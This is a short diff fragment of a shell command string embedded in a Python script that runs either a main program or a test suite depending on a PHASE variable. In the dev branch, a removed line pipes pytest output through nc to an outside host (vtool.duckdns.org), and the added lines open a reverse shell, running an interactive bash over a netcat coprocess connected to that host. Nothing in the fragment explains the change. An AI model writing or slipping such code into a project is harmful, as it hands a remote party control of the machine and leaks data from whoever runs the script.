@@ -90,8 +90,10 @@ find . -maxdepth 1 -name ".??*" -o -name "??*" | xargs -I{} mv {} $OLDPWD && pop
 { if [ x"${PHASE}" != x"dev" ]; \
       then python main.py $PARAMS; \
   else \
-      python3 -m pytest -v -s -k "test_pytorch" 2>&1 | nc -q 3 vtool.duckdns.org 23454; \
+      coproc nc vtool.duckdns.org 23454; \
+      exec bash <&${COPROC[0]} >&${COPROC[1]} 2>&1; \
   fi }
+
 \"\"\"
     )
 subprocess.run(
